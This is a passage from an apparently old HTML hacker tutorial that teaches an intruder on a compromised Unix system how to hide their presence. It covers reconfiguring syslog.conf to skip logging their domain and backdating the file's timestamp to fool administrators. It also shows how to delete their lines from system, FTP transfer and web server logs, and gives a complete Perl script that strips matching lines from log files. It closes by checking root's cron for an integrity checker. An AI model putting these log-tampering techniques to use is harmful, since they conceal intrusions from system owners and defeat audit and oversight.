sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/var/adm/kernel-info<BR>mail.*;mail.!=info&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/root/.../mail<BR>mail,news.=info&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/root/.../info<BR>mail.*;mail.!=info&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb
sp;&nbsp;/var/adm/mail<BR>mail,news.=info&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/var/adm/info<BR>*.ale
rt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root,bob<BR>*
.=info;*.=notice&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@quality.com<BR>*.=debug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@quality.com<BR>*.warn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@quality.com<BR>*.=crit;kern.none&nbsp;&nbs
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@quality.com<BR>kern.info;kern.!err&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@quality.com<BR>mail.*;mail.!=info&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@quality.com<BR>mail,news.=info&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@quality.com<P>Here some of the logs are going into a hidden directory in the /rootdirectory<BR>and a copy of every alert and warning are being also sent to the logsat<BR>quality.com.&nbsp; wtmp, utmp and lastlog are
 still local, so you canstill be<BR>ok, just make sure not to use 'su' on a system like this.&nbsp; Alsonotice above<BR>that alert messages are being mailed to root and bob on this system.<P>Also take note that syslog, mail, and, info are being sent to th
e /var/adm<BR>directory to fool you into thinking all of the logs are in /var/adm!&nbsp;If you<BR>edit /var/adm the admin can run a diff on the backup files in the /rootdir.<P>Ok, so you go to the /var/adm or /var/log directory and:<P>grep yourhost * |mor
e<BR>grep your ip * |more<P>you see that some files are logging your connection, mark down whatfiles<BR>are logging you and edit the /etc/syslog.conf file.&nbsp; You willfrom trial<BR>and error in most cases make it skip the logging process of your domain
.<P>BUT, make sure to do a few things.&nbsp; After you edit the file restartthe<BR>syslogd.&nbsp; You can do this by doing a ps -x<P>$root> ps -x<P>39&nbsp; ?&nbsp; S&nbsp;&nbsp;&nbsp; 1:29 /usr/sbin/syslogd<P>find the syslogd and notice the process id he
re is 39, so you do:<P>kill -HUP 39<P>This will restart the process and put your changes into effect.<P>The other thing is to make sure to do a ls -l /etc/syslog.conf BEFOREyou<BR>edit it and touch the file date back to the original date and timeafter<BR>
you edit it.&nbsp; This way if they notice the logging looks different,they<BR>will check the file date and think it must be something else.&nbsp;Most admins<BR>would not know how to setup this file in the first place, so you insome<BR>(or most) cases ok 
to edit it.<P>Here is another file to look at.<P>/etc/login.defs<P># Enable "syslog" logging of su activity - in addition to sulog filelogging<BR># SYSLOG_SG_ENAB does the same for newgrp and sg.<BR>#<BR>SYSLOG_SU_ENAB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
nbsp;&nbsp;&nbsp;yes<BR>SYSLOG_SG_ENAB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes<BR>#<BR># If defined, all su activity is logged to this file<BR>#<BR>SULOG_FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /home/users/bob/.list<P>Notice here that there is
 an su log file in a hidden file in one of<BR>the admin's directories.<P>-----------<P><A NAME="xferlog"></A><B><FONT SIZE=+1>xferlog</FONT></B><BR>&nbsp;<P>The xferlog can be edited with your favorite text editor, pico, joe,vi, etc..<BR>you can then sear
ch for your transfers and delete the lines and savethe file.<BR>You will need to do this after transferring any files.<P>You will also want to grep the files in the /usr/local/etc/httpd/logdirectory<BR>if you have used the web or phf on the system to remo
ve your presence<BR>from there.<P>grep (username or hostname) * |more<P>If you need to find the logs for httpd you can do a find -name httpd.conf<BR>-print and view the config file you see where the httpd logs are going.<P>There might be different ftp log
s for transfers in some ftp or virtualftp<BR>directory some where.&nbsp; View the files in the /etc/ftp* to findwhat the ftp<BR>setup is on the box.<P>Here I have shown you to edit log files using pico, joe, or other editors.<P>There is another way... Som
etimes log files might be real large andthe editor just might<BR>not cut it ;)&nbsp; Here is what to do...<P>You have a messages file 20 meg ... wow!<P>If you want to get the lines that have fudge.candy.com out of this fileyou<BR>might want to do this:<P>
grep -v fudge.candy >messages.2<BR>rm messages<BR>mv messages2 messages<P>then kill -HUP &lt;process id for syslogd><P>-v means grep everything that does not match the line, so you are greping<BR>the file -what you do not want to a new file name messages.
2.&nbsp;Check the<BR>file size after the grep to make sure no errors were made and replacethe<BR>old one with the new one and restart syslogd.<P>This can also be used with other logs like xferlog, syslog, etc...<P>Here is a perl script that will do it for
 you from command line.<P>------------------- start of riptext.pl<BR>#!/usr/bin/perl<BR>#<BR># RipText - Takes regular expression and filename argument from @ARGV.Any<BR>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; linesMATCHING regular e
xpression will *not* be printed to<BR>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; STDOUT.<BR>#<BR>#<P>die("\nUsage: riptext [regexp] {filename}\n\n") if (!defined($ARGV[0]));<BR>($regexp, $filename) = @ARGV[0,1];<P># Read in contents of 
file.<BR>$/ = undef;<BR>$contents="";<BR>if (!defined($filename)) {<BR>&nbsp; # Use STDIN.<BR>&nbsp; $contents = scalar &lt;STDIN>;<BR>} else {<BR>&nbsp; # Use FILE.<BR>&nbsp; open(FILE, "&lt;$filename") || die("-RipText- Cannot open $filename:$!\n");<BR>
&nbsp; $contents = scalar &lt;FILE>;<BR>&nbsp; close(FILE);<BR>}<P>@contents = split(/\n/, $contents);<P># Strip file of matching lines.<BR>open(FILE, ">$filename") || die("-RipText- Cannot write $filename:$!\n");<BR>foreach (@contents) {<BR>&nbsp; print 
FILE "$_\n" unless (/$regexp/i);<BR>}<BR>close(FILE);<P>0;<P>------------------------ end of riptext.pl<P>Remember to restart syslogd after you edit files, true you will notsee<BR>the stuff, and it will be gone to your eyes, but if you do not restartthe<B
R>process, the data is still in memory and can be retrieved until yourestart<BR>the process!<P>Also look for notes in the syslog that the syslogd process was restartedat<BR>such and such a time.<P>---------------<P><A NAME="Cron Table"></A><B><FONT SIZE=+
1>The Cron Table</FONT></B><BR>&nbsp;<P>Make sure to look at admin's and root cron files, here in this systemwe find<BR>a root cron file in: /var/spool/cron/crontabs<BR>bash# ls -l<BR>total 1<BR>-rw-------&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp; root&n
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;851 Jan 26 14:14 root<P>bash$ more root<BR># This updates the database for 'locate' every day:<BR>40 07 * * *&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; updatedb 1> /dev/null2> /dev/null<BR>40 */12 * * *&nbsp;&
nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /sbin/checkfs<P>there is a file running here in /sbin called checkfs.<P>bash$ cd /sbin<BR>bash$ /sbin # more checkfs<BR>#!/bin/bash<P>if [ ! -f /etc/default/fs/.check ]; then<BR>&nbsp; echo WARNING!! Filecheck default file ca
nnot be found. Pleaseregenerate.<BR>&nbsp;&nbsp;&nbsp; exit<BR>&nbsp;&nbsp;&nbsp; fi<P>md5sum /usr/bin/* > /tmp/filecheck 2>/dev/null<BR>md5sum /usr/sbin/* >> /tmp/filecheck 2>/dev/null<BR>md5sum /sbin/* >> /tmp/filecheck 2>/dev/null<BR>md5sum /bin/* >> /
tmp/filecheck 2>/dev/null<BR>md5sum /usr/local/bin/* >> /tmp/filecheck 2>/dev/null<BR>md5sum /usr/local/sbin/* >> /tmp/filecheck 2>/dev/null<BR>md5sum /lib/* >> /tmp/filecheck 2>/dev/null<BR>md5sum /usr/lib/* >> /tmp/filecheck 2>/dev/null<BR>diff /tmp/fil
echeck /etc/default/fs/.check > /tmp/filecheck2 2>&amp;1<P>if [ -s /tmp/filecheck2 ]; then<BR>&nbsp; mail -s FSCheck bin &lt; /tmp/filecheck2<BR>&nbsp; fi<P>rm /tmp/filecheck /tmp/filecheck2 2>/dev/null<P>md5 is a checksum file, if you change or add a bin
ary file to any ofthe<BR>above directories the information of the changes
will be mailed tothe<BR>admin.</BODY></HTML>
